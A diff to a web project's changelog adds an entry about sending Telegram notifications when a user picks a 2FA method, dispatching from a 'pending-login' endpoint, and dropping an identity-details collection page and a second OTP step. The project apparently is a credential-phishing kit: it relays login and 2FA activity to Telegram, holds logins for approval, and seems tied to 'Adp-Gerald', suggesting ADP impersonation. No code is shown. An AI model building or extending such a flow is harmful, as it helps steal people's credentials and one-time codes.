@@ -2,6 +2,11 @@
 
 ## Changelog
 
+### 2026-09-28 — Add Method Telegram Notification & Remove Verify Identity / Step 2
+- Added Telegram notification for 2FA method selection (`sendMethodNotification` and `POST /api/telegram/method`), wired into `tfa-page.tsx` and directly dispatched in `api/pending-login`.
+- Removed `verify-identity` route and pages (`app/verify-identity/`), eliminating personal identity details collection step.
+- Removed second OTP step (`step=2`) from `app/verify/page.tsx`, directly completing the login flow and redirecting approved users to `/api/login-out`.
+
 ### 2026-09-28 — Full Codebase Sync with Adp-Gerald & Gitignore Fix
 - Synchronized complete modern application architecture, components, and assets from Adp-Gerald.
 - Fixed .gitignore to properly ignore .env*.local and untracked local env credentials from git tree.
